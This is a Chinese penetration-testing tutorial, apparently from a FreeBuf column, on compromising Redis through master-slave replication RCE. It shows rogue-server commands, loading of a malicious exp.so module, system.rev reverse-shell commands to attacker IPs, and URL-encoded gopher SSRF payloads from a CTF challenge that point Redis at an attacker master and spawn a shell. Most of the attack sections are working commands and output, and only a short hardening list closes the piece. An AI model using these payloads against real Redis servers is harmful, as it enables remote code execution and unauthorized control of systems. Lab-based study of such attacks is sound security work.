## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

数据库作为业务平台信息技术的核心和基础，承载着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，数据库的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的数据库中往往储存着等极其重要和敏感的信息。这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

今天会讲解到利用主从复制RCE、本地Redis主从复制RCE反弹shell、SSRF Redis
反弹shell、Redis知识拓展、Redis安全防护等操作，如果连Redis都不会安装操作提权等，怎么进行下一步的研究Redis数据库安全！怎么拿下对方服务器？

## 二、利用主从复制RCE

未授权的redis会导致GetShell，可以说已经是众所周知的了。  
而这种方式是通过写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据，形似：  
![1626568067_60f37583b510727040dd1.png!small?1626568068541](https://image.3001.net/images/20210718/1626568067_60f37583b510727040dd1.png!small?1626568068541)

这种主要利用了crontab、ssh
key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了。但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。

漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Reids
4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。

简单的说，攻击者（主机）写一个so文件，然后通过FULLRESYNC（全局）同步文件到受害人（从机）上。

### 1、下载

![1626568058_60f3757a1f6d3ff337d2c.png!small?1626568061291](https://image.3001.net/images/20210718/1626568058_60f3757a1f6d3ff337d2c.png!small?1626568061291)

    
    
    https://github.com/n0b0dyCN/redis-rogue-server
    //未授权
    https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
    //有密码
    

目标靶机是不能开启保护模式，即下图设置才可以！

### 2、帮助

![1626568076_60f3758c6efddc18cba8e.png!small?1626568079215](https://image.3001.net/images/20210718/1626568076_60f3758c6efddc18cba8e.png!small?1626568079215)![1626568081_60f37591945d728675b08.png!small?1626568087188](https://image.3001.net/images/20210718/1626568081_60f37591945d728675b08.png!small?1626568087188)可看到exp执行方法！

### 3、执行反弹

1）执行反弹

    
    
    python3 redis_rogue_server.py -rhost 192.168.253.27 -lhost 192.168.253.9 -passwd dayu123
    

![1626568088_60f3759860f2e47bba14c.png!small?1626568102764](https://image.3001.net/images/20210718/1626568088_60f3759860f2e47bba14c.png!small?1626568102764)Shell?
[i]interactive,[r]reverse:  
有两种方式！

2）开启监听  
![1626568092_60f3759c90cf6ba368ae1.png!small?1626568098873](https://image.3001.net/images/20210718/1626568092_60f3759c90cf6ba368ae1.png!small?1626568098873)本地开启nc的6666监听端口！

3）interactive交互  
![1626568097_60f375a1a397e1fc17f68.png!small?1626568105189](https://image.3001.net/images/20210718/1626568097_60f375a1a397e1fc17f68.png!small?1626568105189)选择i，然后直接交互即可！！

4）选择reverse反弹shell

![1626568100_60f375a4e590b2c74190a.png!small?1626568107425](https://image.3001.net/images/20210718/1626568100_60f375a4e590b2c74190a.png!small?1626568107425)

    
    
    r
    192.168.253.9
    7777
    python3 -c "import pty;pty.spawn('/bin/bash')"
    

![1626568105_60f375a9623a932b40b77.png!small?1626568107425](https://image.3001.net/images/20210718/1626568105_60f375a9623a932b40b77.png!small?1626568107425)

成功获得交互shell！！

## 三、本地Redis主从复制RCE反弹shell

### 1、缺点

要说缺点，先明白上一部分的脚本执行的原理。上述的原理是，目标机器的redis可以被远程其他的机器登录。然后执行脚本内写死的一些命令，利用这些命令我们就可以执行系统命令。问题来了，假如目标机器仅仅允许本地进行登录的时候，上述利用就直接暴毙。这个时候，我们可以通过配合其他漏洞，从目标本地登录redis。然后手动执行脚本内写死的一些命令（这些命令的意思是将本机[靶机]redis作为从机，将攻击机器设置为主机，然后攻击机器会自动将一些恶意so文件同步给目标机器（从机）），从而来实现对目标机器的远程命令执行。

### 2、下载

    
    
    https://github.com/n0b0dyCN/redis-rogue-server
    //未授权
    https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
    //有密码
    

将redis-rogue-server的exp.so文件复制到Awsome文件夹中使用，因为exp.so带system模块！

### 3、执行演示

1）kali开启监听

    
    
    nc -lvnp 9999
    

![1626568118_60f375b659e9ac37e837c.png!small?1626568118841](https://image.3001.net/images/20210718/1626568118_60f375b659e9ac37e837c.png!small?1626568118841)新开一个窗口，来监听，接受会话的反弹！！

2）开启主服务器

    
    
    python3 redis_rogue_server.py -v -path exp.so
    

![1626568125_60f375bdcefb0d5e3bd3c.png!small?1626568127033](https://image.3001.net/images/20210718/1626568125_60f375bdcefb0d5e3bd3c.png!small?1626568127033)开启15000端口的主服务器！

3）Redis主从同步

 **查看是否存在模块：**

    
    
    module list
    

![1626568130_60f375c21ffa86caed7a7.png!small?1626568130512](https://image.3001.net/images/20210718/1626568130_60f375c21ffa86caed7a7.png!small?1626568130512)可看到目前没有可用模块！

 **主从同步：**  
![1626568135_60f375c722f981868055f.png!small?1626568139525](https://image.3001.net/images/20210718/1626568135_60f375c722f981868055f.png!small?1626568139525)

    
    
    config set dir /tmp
    //一般tmp目录都有写权限，所以选择这个目录写入
    config set dbfilename exp.so
    //设置导出文件的名字
    slaveof 192.168.253.9 15000
    
    slaveof 49.234.100.201 15000
    //进行主从同步，将恶意so文件写入到tmp文件
    //端口可以自定义
    

**同步规则：**  
![1626568141_60f375cd3dd58936356fc.png!small?1626568149253](https://image.3001.net/images/20210718/1626568141_60f375cd3dd58936356fc.png!small?1626568149253)
可看到主服务器上FULLRESYNC全局同步数据中！将恶意的exp.so同步到redis服务器上！

 **执行恶意模块：**  
![1626568145_60f375d136a40a4249712.png!small?1626568149253](https://image.3001.net/images/20210718/1626568145_60f375d136a40a4249712.png!small?1626568149253)

    
    
    module load ./exp.so	
    //加载写入的恶意so文件模块
    module list
    //查看恶意so有没有加载成功，主要是有没有“system”
    

可看到加载是成功的!!

 **反弹shell：**  
![1626568152_60f375d8065b6d31b7797.png!small?1626568161376](https://image.3001.net/images/20210718/1626568152_60f375d8065b6d31b7797.png!small?1626568161376)

    
    
    system.rev 192.168.253.9 9999
    //执行反弹命令
    

可看到成功反弹shell，可以进行交互 !!

 **另外一种方式：**  
![1626568155_60f375db3a171b1be9d3f.png!small?1626568162024](https://image.3001.net/images/20210718/1626568155_60f375db3a171b1be9d3f.png!small?1626568162024)

    
    
    system.exec "id"
    //当然也可以通过这种方式来执行系统命令
    

也可以直接执行命令！

 **关闭主从同步：**  
![1626568160_60f375e051e8868a1d360.png!small?1626568162024](https://image.3001.net/images/20210718/1626568160_60f375e051e8868a1d360.png!small?1626568162024)

    
    
    slaveof NO ONE
    //关闭主从
    

本地redis服务器关闭，或者直接在主服务器关闭也行！

## 四、SSRF Redis 反弹shell

网鼎杯2020玄武组SSRFME题！

### 1、加载源码

 **index.php源码：**

    
    
    <?php
    function check_inner_ip($url)
    {
        $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
        if (!$match_result)
        {
            die('url fomat error');
        }
        try
        {
            $url_parse=parse_url($url);
        }
        catch(Exception $e)
        {
            die('url fomat error');
            return false;
        }
        $hostname=$url_parse['host'];
        $ip=gethostbyname($hostname);
        $int_ip=ip2long($ip);
        return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
    }
    
    function safe_request_url($url)
    {
    
        if (check_inner_ip($url))
        {
            echo $url.' is inner ip';
        }
        else
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            $output = curl_exec($ch);
            $result_info = curl_getinfo($ch);
            if ($result_info['redirect_url'])
            {
                safe_request_url($result_info['redirect_url']);
            }
            curl_close($ch);
            var_dump($output);
        }
    
    }
    if(isset($_GET['url'])){
        $url = $_GET['url'];
        if(!empty($url)){
            safe_request_url($url);
        }
    }
    else{
        highlight_file(__FILE__);
    }
    // Please visit hint.php locally.
    ?>
    

**hint.php源码：**

    
    
    string(1342) " <?php
    if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
      highlight_file(__FILE__);
    }
    if(isset($_POST['file'])){
      file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
    }
    "
    

![1626568171_60f375ebe1e6beca1328d.png!small?1626568180719](https://image.3001.net/images/20210718/1626568171_60f375ebe1e6beca1328d.png!small?1626568180719)txt文本复制后改名为index.php，hint.php一样的操作！！

 **然后放入kali安装的宝塔目录下即可：**  
放入后在创建！！

    
    
    1. 绕过 条件判断 
    2. 访问 hint.php文件获取reids密码 
    3. 利用ssrf gopher协议 打redis
    4. redis 主从漏洞 反弹shell
    

### 2、绕过条件判断

1）绕过条件判断  
![1626568176_60f375f0bb8e2bcbedce1.png!small?1626568180719](https://image.3001.net/images/20210718/1626568176_60f375f0bb8e2bcbedce1.png!small?1626568180719)访问http://192.168.253.66/index.php代码审计php发现存在本地条件判断绕过！

 **绕过：**

![1626568181_60f375f52df163ba819f4.png!small](https://image.3001.net/images/20210718/1626568181_60f375f52df163ba819f4.png!small)

    
    
    ?url=http://0.0.0.0/hint.php
    

绕过访问hint.php文件获取reids密码，经过测试该redis仅允许本地登录！！

### 3、开启主服务器

1）设置本地监听6379  
![1626568189_60f375fd4709591830702.png!small?1626568189805](https://image.3001.net/images/20210718/1626568189_60f375fd4709591830702.png!small?1626568189805)

2）开启主服务器  
![1626568194_60f37602f2ba998704cd7.png!small?1626568197996](https://image.3001.net/images/20210718/1626568194_60f37602f2ba998704cd7.png!small?1626568197996)

    
    
    python3 redis-rogue-server.py --rhost 127.0.0.1 --lhost 192.168.253.9
    

开启主从复制漏洞进行攻击！

### 3、ssrf gopher联动redies拿shell

1）设置目录

    
    
    gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit
    
    gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.253.67%252021000%250d%250aquit
    

![1626568201_60f376099708d47259827.png!small?1626568204640](https://image.3001.net/images/20210718/1626568201_60f376099708d47259827.png!small?1626568204640)

执行：  
![1626568206_60f3760ed0e23e9426dc5.png!small?1626568207928](https://image.3001.net/images/20210718/1626568206_60f3760ed0e23e9426dc5.png!small?1626568207928)成功设置导出的路径为tmp！

![1626568210_60f37612ce7d1ba7973dd.png!small?1626568211797](https://image.3001.net/images/20210718/1626568210_60f37612ce7d1ba7973dd.png!small?1626568211797)每次操作空格一下，这是提示操作以及同步！

![1626568214_60f37616d1ae75c0e1a51.png!small?1626568215490](https://image.3001.net/images/20210718/1626568214_60f37616d1ae75c0e1a51.png!small?1626568215490)设置导出文件名为exp.so！！

2）导入模块

    
    
    gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520./exp.so%250d%250aquit
    

![1626568220_60f3761c4cfa81a7f9ce2.png!small?1626568221147](https://image.3001.net/images/20210718/1626568220_60f3761c4cfa81a7f9ce2.png!small?1626568221147)

![1626568224_60f376208967032cf1945.png!small?1626568225235](https://image.3001.net/images/20210718/1626568224_60f376208967032cf1945.png!small?1626568225235)执行恶意exp.so进行主从交互！

![1626568229_60f3762556c6669fd336d.png!small?1626568230129](https://image.3001.net/images/20210718/1626568229_60f3762556c6669fd336d.png!small?1626568230129)

3）关闭主从

    
    
    gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aslaveof%2520NO%2520ONE%250d%250aquit
    

![1626568234_60f3762a59c008d25e9f4.png!small?1626568236505](https://image.3001.net/images/20210718/1626568234_60f3762a59c008d25e9f4.png!small?1626568236505)

![1626568239_60f3762f99a7f83f60aaf.png!small?1626568240889](https://image.3001.net/images/20210718/1626568239_60f3762f99a7f83f60aaf.png!small?1626568240889)

4）导出数据库  
![1626568243_60f3763384d3612353d23.png!small?1626568244369](https://image.3001.net/images/20210718/1626568243_60f3763384d3612353d23.png!small?1626568244369)

    
    
    gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit
    

![1626568248_60f376383defbc7778dc8.png!small?1626568249864](https://image.3001.net/images/20210718/1626568248_60f376383defbc7778dc8.png!small?1626568249864)

![1626568252_60f3763c1b3f5aa30763b.png!small?1626568253398](https://image.3001.net/images/20210718/1626568252_60f3763c1b3f5aa30763b.png!small?1626568253398)

5）反弹shell

本地开启监听：  
![1626568256_60f3764010bc4efc43b34.png!small?1626568256564](https://image.3001.net/images/20210718/1626568256_60f3764010bc4efc43b34.png!small?1626568256564)

检查步骤：  
![1626568259_60f376439273cd72ab037.png!small?1626568260196](https://image.3001.net/images/20210718/1626568259_60f376439273cd72ab037.png!small?1626568260196)

    
    
    gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250asystem.rev%2520192.168.253.67%25208899%250d%250aquit
    

![1626568264_60f376488b14544d3a306.png!small?1626568265265](https://image.3001.net/images/20210718/1626568264_60f376488b14544d3a306.png!small?1626568265265)

![1626568268_60f3764c9ef1b95affb8a.png!small?1626568269452](https://image.3001.net/images/20210718/1626568268_60f3764c9ef1b95affb8a.png!small?1626568269452)

查看监听：  
![1626568272_60f376506ee89d775b26d.png!small?1626568273876](https://image.3001.net/images/20210718/1626568272_60f376506ee89d775b26d.png!small?1626568273876)正常交互！

![1626568276_60f376549ef0250c18778.png!small?1626568285085](https://image.3001.net/images/20210718/1626568276_60f376549ef0250c18778.png!small?1626568285085)![1626568280_60f3765842c238c4f890e.png!small?1626568285085](https://image.3001.net/images/20210718/1626568280_60f3765842c238c4f890e.png!small?1626568285085)

### 4、知识拓展

1）RESP协议  
定义：

    
    
    redis客户端与服务端通信，使用RESP（REdis Serialization Protocal，redis序列化协议）协议通信，该协议是专门为redis设计的通信协议，但也可以用于其它客户端-服务器通信的场景。RESP可以用于序列化不同的数据类型，
    
    如：整型、字符串、数组…并且为错误提供专门的类型；客户端发送请求时，以字符串数组的作为待执行命令的参数。redis服务器根据不同的命令返回不同的数据类型。
    

支持协议：

    
    
    RESP协议支持5种数据类型：
    
    简单字符串（Simple Strings）
    错误数据（Errors）
    整数（Integers）
    批量字符串（Bulk Strings）
    数组（Arrays）
    
    
    
    *3，代表数组的长度为3（类似[“set”,”name”,”Sn0w”]），
    $4代表字符串的长度，就是Sn0w，
    0d0a即\r\n表示结束符；
    +OK表示服务端执行成功后返回的字符串
    

2）Gopher协议

 **定义：**  
在 http 出现之前，访问网页需要输入的是“ gopher://gopher.baidu.com/ ”，而不是 “
https://www.baidu.com/
”，而它被代替的原因一方面是收费，另一方面的原因是它固化的结构没有HTML网页灵活。gopher协议支持GET&POST请求，常用于攻击内网ftp、redis、telnet、smtp等服务，还可以利用gopher协议访问redis反弹shell

 **协议格式：**  
gopher://127.0.0.1:70/ + TCP/IP数据，gopher的默认端口为70，``是一种数据连接格式，也可以是其他字符

 **协议的实现：**  
gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行url编码，这样gopher协议才能正确解析。

 **支持gopher协议的有 curl 和 libcurl：**

    
    
    使用curl来发起Gopher请求：
    		curl gopher://192.168.66.132:6379/_*2
    		$3
    		get
    		$4
    		name
    

**生成gopher协议语句：**

    
    
    将其转换为gopher格式的数据传入，转换规则
    
    Windows 在行尾使用 CRLF (carriage return/line feed, 0d 0a)
    
    UNIX 只使用 LF(0a)
    
    参考了很多师傅们的博客，都说是直接url编码即可，但应该确切一点是 url16进制加密.
    

gopher语句生成工具：

    
    
    下载地址：		
    https://github.com/tarunkant/Gopherus
    

![1626568290_60f376620c92fbd596fd9.png!small?1626568290690](https://image.3001.net/images/20210718/1626568290_60f376620c92fbd596fd9.png!small?1626568290690)

### 5、另外平台

buuoj平台：  
https://buuoj.cn/

![1626568300_60f3766c235e3bf664162.png!small?1626568303946](https://image.3001.net/images/20210718/1626568300_60f3766c235e3bf664162.png!small?1626568303946)![1626568299_60f3766b72c30ef67f27d.png!small?1626568303945](https://image.3001.net/images/20210718/1626568299_60f3766b72c30ef67f27d.png!small?1626568303945)

http://b4a188ec-67cd-4b40-b916-cc9b0e5c53c5.node3.buuoj.cn

![1626568304_60f37670cceb2ea31f359.png!small?1626568305846](https://image.3001.net/images/20210718/1626568304_60f37670cceb2ea31f359.png!small?1626568305846)

![1626568310_60f37676e8fcb79b47d57.png!small?1626568315391](https://image.3001.net/images/20210718/1626568310_60f37676e8fcb79b47d57.png!small?1626568315391)

需要重新创建小号！！  
https://buuoj.cn/challenges

## 五、Redis安全防护

Redis的安全设置：设置完毕，需要重加载配置文件启动redis！！

1、绑定内网IP地址进行访问  
2、requirepass 设置redis密码  
3、保护模式开启 protected-mode 开启 （默认开启）  
4、最好把端口更改  
5、单独为redis设置一个普通账号 启动redis

从以上内容可以得知，安全是一个整体的概念。有一处出现差错都有可能影响全局。如一个redis的问题就可以让整台服务器被攻破。

## 六、总结

今天学到了利用主从复制RCE、本地Redis主从复制RCE反弹shell、SSRF Redis
反弹shell、Redis知识拓展、Redis安全防护的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）......
    

接下来在《服务攻防之数据库Mongodb（上）》会接触到如何进行介绍和Labs安装、在Kali-2021中安装MongoDB、学习Mongo
Shell等操作，如何提权渗透等方法，请看下篇服务攻防之数据库Mongodb上篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

